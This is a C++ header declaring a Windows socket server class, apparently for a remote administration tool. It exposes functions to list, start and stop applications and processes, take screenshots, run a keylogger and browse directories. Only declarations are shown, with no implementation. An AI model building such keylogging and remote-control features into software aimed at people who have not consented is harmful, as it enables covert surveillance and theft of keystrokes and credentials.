#pragma once

#include <string>
#include <vector>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <thread>

#include "../Message/Response.h"
#include "function_Windows/Object/Keylog.h"

class Server{
private:
    SOCKET disfd;
    SOCKET listener;
    std::vector <pollfd> pfds;
    Keylogger* _keylog;
public:
    Server(const char* port);
    ~Server();

    void start();
    
    Response listApp();
    Response startApp(const char* appName);
    Response stopApp(const char* appName);

    Response listProcess();

    Response screenShot();

    Response startKeyLog(int sockfd);
    Response stopKeyLog(int sockfd);

    Response dirTree(const char* pathName); 
};